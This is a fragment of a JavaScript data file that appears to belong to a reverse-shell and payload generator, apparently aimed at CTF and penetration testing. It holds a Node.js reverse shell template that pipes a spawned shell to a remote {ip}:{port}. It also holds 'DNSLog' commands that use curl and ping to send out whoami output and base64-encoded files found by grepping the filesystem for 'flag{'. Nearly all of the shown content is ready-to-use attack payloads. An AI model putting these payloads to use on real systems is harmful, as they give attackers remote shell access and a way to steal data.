...
//         },
	    ...
	    {
            "name": "node.js #2",
            "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"\{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect({port}, \"{ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return \/a\/; \/\/ Prevents the Node.core application from crashing\r\n})();",
...
const DNSLogCommands =  withCommandType(
    CommandType.DNSLog,
    [
        {
            "name": "Curl Get Flag",
            "command": "curl http://{ip}/?r=`find / -type f -exec grep \"flag{\" {} \\;|base64`",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "PING whoami",
            "command": "ping `whoami`.{ip}",
            "meta": ["linux", "mac", "windows"]
        },
        {
            "name": "Curl whoami",
            "command": "curl http://{ip}/?r=`whoami`",
            "meta": ["linux", "mac", "windows"]
        }
    ]
);
